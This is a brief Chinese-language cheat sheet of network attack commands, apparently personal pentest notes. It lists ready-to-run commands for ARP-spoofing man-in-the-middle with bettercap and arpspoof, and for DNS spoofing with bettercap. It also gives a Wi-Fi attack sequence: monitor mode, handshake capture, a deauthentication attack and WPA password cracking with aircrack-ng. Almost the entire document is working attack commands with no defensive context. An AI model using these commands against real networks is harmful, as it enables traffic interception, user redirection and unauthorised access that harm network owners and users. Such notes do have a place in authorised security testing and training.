# 网络攻击

## ARP 欺骗（中间人攻击）

```bash
# Bettercap
bettercap -eval "set arp.spoof.targets 10.0.0.2; arp.spoof on; net.sniff on"

# 手动（arpspoof）
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 10.0.0.2 -r 10.0.0.1
```

## DNS 欺骗

```bash
# Bettercap DNS 欺骗
bettercap -eval "set dns.spoof.domains *.example.com; set dns.spoof.address 10.0.0.100; dns.spoof on"
```

## Wi-Fi 攻击

```bash
# 开启监听模式
airmon-ng start wlan0

# 扫描 AP
airodump-ng wlan0mon

# 抓握手包
airodump-ng -c 6 --bssid AP_MAC -w capture wlan0mon

# Deauth 攻击（强制客户端重连，以便抓握手包）
aireplay-ng -0 5 -a AP_MAC wlan0mon

# WPA 破解
aircrack-ng -w wordlist.txt capture-01.cap
```
